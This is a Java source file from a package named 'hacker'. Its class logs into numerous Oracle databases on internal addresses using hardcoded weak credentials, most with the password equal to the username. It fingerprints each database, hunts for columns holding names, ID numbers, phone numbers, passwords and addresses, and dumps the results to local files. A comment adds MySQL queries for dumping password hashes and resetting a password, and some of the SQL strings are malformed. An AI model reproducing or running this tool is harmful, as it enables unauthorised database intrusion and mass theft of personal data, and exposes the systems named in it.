package com.mtx.xiatian.hacker;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

import com.mtx.core._.Base64;
import com.mtx.core.common.IConst;
import com.mtx.core.tools.dbtools.SysDbUtils;
import com.mtx.face.IMyResultHandler;
import com.mtx.xiatian.evolvedata.MyThreadPoolExecutor;

/**
 * <pre>
 * 1、自动分析数据库
 * 2、并下载数据
 *  3、支持oracle、mysql
 *  
 *  4、myslq查看已经登录用户
 *  select user,host,password from mysql.user;
 *  select user,host,password from user;
 * update mysql.user set password=PASSWORD('Miracle***888') where user='mydb';
 * flush privileges;
 * </pre>
 * 
 * @author xiatian 2015-12-25
 * 
 */
public class GetOracleDB extends CommonTools
{

	public GetOracleDB()
	{
	}

	public SysDbUtils	sdb1	 = SysDbUtils.getInstance();

	private String	  md5Path	 = "";

	private String	  szConnInfo	= "";

	/**
	 * 设置连接信息
	 * 
	 * @param jdbcUrl
	 * @param user
	 * @param pswd
//	 */
	public GetOracleDB(String jdbcUrl, String user, String pswd)
	{
		setConnInfo(jdbcUrl, user, pswd);
		sdb1.setConnInfo(jdbcUrl, user, pswd);
		szConnInfo = IConst.getString(new String[]
		{ jdbcUrl, ", ", user, ", ", pswd });
		String ip = jdbcUrl.replaceAll("(^.*?\\//)|(:.*?$)", "") + "_";
		md5Path = "/Volumes/dbdata/sgkzl/MTX私有/mysql/dbinfo/" + ip + user;
		info("当前存储数据路径：", md5Path);
//		new File(md5Path).mkdirs();
	}

	/**
	 * <pre>
	 * 获取数据库信息:
	 * 当前连接的instance名，主机名，版本、启动时间
	 * instance_name, host_name, version, startup_time
	 * </pre>
	 * 
	 * @param lst
	 */
	public void getDBInfo(final List<Map<String, Object>> lst)
	{
		queryForSelf("select instance_name, host_name, version, startup_time from v$instance", lst);
	}
	
	/**
	 * 执行一个sql
	 * @param lst
	 * @param out
	 * @param szMsg
	 * @param sql
	 */
	public void doOneSql(final List<Map<String, Object>> lst, OutputStream out, String szMsg, String sql)
	{
		if(0 < szMsg.length())
			log(out, szMsg);
		log(out, sql);
		queryForSelf(sql, lst);
	}
	
	/**
	 * 查看系统表信息
	 * @param lst
	 */
	public void getDBOthers(final List<Map<String, Object>> lst, OutputStream out)
	{
		String sSql;
		for(String s: new String[]{"all_tables", "user_tab_columns", "all_tab_columns", "user_objects", "user_tab_comments", "user_col_comments"})
		{
			sSql = "select * from " + s;
			doOneSql(lst, out, "", sSql);
		}
		doOneSql(lst, out, "所有表空间", "selecttablespace_name,sum(bytes)/1024/1024 from dba_data_files  group by tablespace_name");
		doOneSql(lst, out, "查看未使用表空间大小", "selecttablespace_name,sum(bytes)/1024/1024 from dba_free_space group bytablespace_name");
	}
	
	

	/**
	 * <pre>
	 * 获取数据库DBID信息:v$database
	 * 包含安装的系统环境信息
	 * </pre>
	 * 
	 * @param lst
	 */
	public void getDBIDInfo(final List<Map<String, Object>> lst)
	{
		queryForSelf("select * from v$database", lst);
	}

	/**
	 * <pre>
	 * 获取数据库DBID信息:product_component_version
	 * 产品信息
	 * </pre>
	 * 
	 * @param lst
	 */
	public void getProductInfo(final List<Map<String, Object>> lst)
	{
		queryForSelf("select * from product_component_version", lst);
	}

	/**
	 * <pre>
	 * 获取数据库安装配置信息:v$option
	 * </pre>
	 * 
	 * @param lst
	 */
	public void getInstallOptionInfo(final List<Map<String, Object>> lst)
	{
		queryForSelf("select * from v$option", lst);
	}

	/**
	 * 获取用户表信息： table_name,num_rows
	 * 
	 * @param lst
	 */
	public void getUserTable(final List<Map<String, Object>> lst)
	{
		queryForSelf("select table_name,num_rows from user_tables  order by num_rows desc", new ArrayList<Map<String, Object>>(){

			@Override
            public boolean add(Map<String, Object> o)
            {
				Object obj = o.get("num_rows");
				String ac01 = String.valueOf(o.get("table_name"));
				if(null == obj || "0".equals(String.valueOf(obj).trim()));
				else 
					lst.add(o);
				if("ac01".equalsIgnoreCase(ac01))
				{
					info("ac01: ",  obj);
				}
	            return true;
            }
			
		});
	}

	/**
	 * 获取所有列表字段描述：table_name,column_name,comments
	 * 
	 * @param lst
	 */
	public void getColComments(final List<Map<String, Object>> lst)
	{
		queryForSelf("select table_name,column_name,comments from user_col_comments where not comments is null", lst);
	}

	/**
	 * <pre>
	 * 获取敏感列表字段描述
	 * 1、返回的列：table_name,column_name,comments
	 * 2、敏感列：姓名、身份、电话、密码、地址、单位、名称、联系、机构、编号
	 * 3、如果列没有中文描述则无法搜索到敏感列
	 * </pre>
	 * 
	 * @param lst
	 */
	public void getSensitiveColComments(final List<Map<String, Object>> lst, String szTableName)
	{
		queryForSelf(
		        "select table_name,column_name,comments from user_col_comments where "
		                + (isEmpty(szTableName) ? "" : "table_name = '" + szTableName + "' and ")
		                + "( comments like '%姓名%' or comments like '%身份%' or comments like '%电话%' or comments like '%密码%' or comments like '%地址%' or comments like '%单位%' or comments like '%名称%' or comments like '%联系%' or comments like '%机构%' or comments like '%编号%') order by table_name",
		        lst);
	}

	/**
	 * 查询sql语句
	 * 
	 * @param sql
	 * @param lst
	 */
	protected void queryForSelf(String sql, final List<Map<String, Object>> lst)
	{
		lst.clear();
		try
		{
			sdb1.queryForList(sql, new IMyResultHandler()
			{
				public void doResult(Map<String, Object> m)
				{
					Map<String, Object> m1 = new HashMap<String, Object>();
					// 去除null值
					for (String s : m.keySet())
					{
						if (null != m.get(s))
							m1.put(s, m.get(s));
					}
					lst.add(m1);
				}
			});
		}catch(Throwable e){}
	}

	public void doAnalyse(String... a)
	{
		GetOracleDB godb = new GetOracleDB(a[0], a[1], a[2]);
		OutputStream out = null;
		File f = new File(godb.md5Path + ".txt");
		final OutputStream out1;
		if(f.exists())return;
		try
		{
			out = new FileOutputStream(f , true);
			out1 = out;
			List<Map<String, Object>> lst = new ArrayList<Map<String, Object>>()
			{
				private final long	serialVersionUID	= 1L;

				private boolean		start				= false;

				public boolean add(Map<String, Object> m)
				{
					if (null != m && 0 < m.size())
					{
						StringBuffer sb = new StringBuffer(), sbC = new StringBuffer();
						int i = 0;
						for (String k : m.keySet())
						{
							// 输出标题行
							if (!start)
							{
								if (0 < i)
									sbC.append(", ");
								sbC.append(k);
							}
							if (0 < i)
								sb.append(", ");
							sb.append(String.valueOf(m.get(k)).trim());
							i++;
						}
						if (!start)
							info(out1, sbC.append("\n").toString());
						start = true;
						info(out1, sb.append("\n").toString());
					}
					return true;
				}

				public void clear()
				{
					start = false;
					super.clear();
				}
			};
			log(out, "当前数据库信息：\n", godb.szConnInfo, "\n==================\n\n");

			log(out, "1、数据库实例信息\n");
			godb.getDBInfo(lst);

			log(out, "\n2、安装环境信息\n");
			godb.getDBIDInfo(lst);
			log(out, "\n3、数据库产品信息\n");
			godb.getProductInfo(lst);

			log(out, "\n4、数据库安装配置信息\n");
			godb.getInstallOptionInfo(lst);

			log(out, "\n5、获取用户表信息\n");
			godb.getUserTable(lst);

			log(out, "\n6、获取所有列表字段描述\n");
			godb.getColComments(lst);

//			log(out, "\n7、一些统计\n");
//			TreeMap<String, Object> m = godb.querySQL("select count(1) cnt from ac01");
//			log(out, "ac01: ", m.get("ac01"),"\n");
//			m = godb.querySQL("select count(1) cnt from ab01");
//			log(out, "ab01: ", m.get("ab01"),"\n");
			
			log(out, "\n\n\n\n=================\n8、获取敏感列表字段描述\n");
			godb.getSensitiveColComments(lst, null);
			log(out, "=================\n\n\n\n");
			
			log(out, "\n8、同义词信息\n");
			godb.querySQL("select * from dba_synonyms", false, new ArrayList<TreeMap<String, Object>>(){
                public boolean add(TreeMap<String, Object> m1)
                {
					log(out1, m1.toString());
	                return true;
                }
			});
			log(out, "\n9、系统表信息\n");
			getDBOthers(lst, out);
		} catch (Exception e)
		{
			System.out.println(a[0] + " " + a[1] + " "+ a[2]);
			info(e);
		} finally
		{
			if (null != out)
			{
				try
				{
					out.flush();
				} catch (Exception e)
				{
					info(e);
				}
				try
				{
					out.close();
				} catch (Exception e)
				{
					info(e);
				}
			}
			if (1024 > f.length())
			{
				f.delete();
				f = new File(godb.md5Path);
				f.delete();
			}

			System.out.println("Ok: " + a[0] + " " + a[1] + " "+ a[2]);
		}
	}

	public static void main1(final String... args)
	{
		MyThreadPoolExecutor.getInstance().addRunnable(new Runnable()
		{
			public void run()
			{
				try
				{
					Thread.sleep(333);
					GetOracleDB godb = new GetOracleDB();
					 IConst.bMyDebug = IConst.g_bDebug = true;
					godb.doAnalyse(args[1], args[2], args[3]);
				} catch (Exception e)
				{
				}
				{
				}
			}
		});
	}

	/**
	 * @param args
	 */
	public static void main(String[] args)
	{
		IConst.g_bDebug = IConst.bMyDebug = false;
		
//		main1("com.mysql.jdbc.Driver","jdbc:mysql://172.16.28.11:3306/mysql?relaxAutoCommit=true&useUnicode=true&characterEncoding=utf8", "test", "test");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "csisca", "csisca");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "JY15GC99900_1", "jy15gc99900");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "JY14GD02100_01", "JY14GD02100_01");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "JY14GD02100_03", "JY14GD02100_03");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "JY14GD02100_02", "JY14GD02100_02");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "JY12CD008_tkbx", "JY12CD008");
		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.60:1521:yhdb", "yhjypt", "yhjypt");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.106:1521:orcl", "scjm2", "scjm2");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "yhjy", "yhjy");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "jysys", "jysys");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "jysite", "jysite");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.190:1521:orcl", "yhportal", "yhportal");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.207:1521:orcl", "ta3test", "ta3test");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.184:1521:testdb", "ta3", "ta3");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_frame", "yn01700_frame");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_com", "yn01700_com");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_i", "yn01700_i");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_param", "yn01700_param");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.153:1521:testdb", "tywscx", "tywscx");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.153:1521:testdb", "tywscx", "tywscx2014");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.153:1521:testdb", "gzjkk", "gzjkk");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.153:1521:testdb", "gzcms", "gzcms");
//		 main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.106:1521:orcl", "scjm2", "scjm2");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "yhjy", "yhjy");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "jysys", "jysys");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.220:1521:yhdb", "jysite", "jysite");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.190:1521:orcl", "yhportal", "yhportal");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.207:1521:orcl", "ta3test", "ta3test");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.184:1521:testdb", "ta3", "ta3");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_frame", "yn01700_frame");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_com", "yn01700_com");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_i", "yn01700_i");
//		main1("oracle.jdbc.driver.OracleDriver","jdbc:oracle:thin:@192.168.10.184:1521:testdb", "ylfwjk", "ylfwjk");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.26.21:1521:basedb", "yn01700_P", "yn01700_P");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.26.21:1521:testdb", "yn01700_P", "yn01700_P");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.153:1521:testdb", "tyqw", "tyqw2014");
//		main1("oracle.jdbc.driver.OracleDriver", "jdbc:oracle:thin:@192.168.10.213:1521:testdb", "yn01700_p", "yn01700_p");
		// godb.doAnalyse("jdbc:oracle:thin:@192.168.24.1:1521:orcl", "ylfwjk",
		// "ylfwjk");
		// godb.doAnalyse("jdbc:oracle:thin:@192.168.1.106:1521:orcl", "ylfwjk",
		// "ylfwjk");
		// godb.doAnalyse("jdbc:oracle:thin:@10.163.19.57:1521:orcl", "ylfwjk",
		// "ylfwjk");
		// godb.doAnalyse("jdbc:oracle:thin:@192.168.100.55:1521:orcl",
		// "ylfwjk", "ylfwjk");
		// godb.doAnalyse("jdbc:oracle:thin:@192.168.1.44:1521:mydb", "ylfwjk",
		// "ylfwjk");
		
		/*http://118.112.188.109/nethall/
houliang(侯亮) 14:24:38
www.xxx.com
mail.xxx.com*/
	}

}
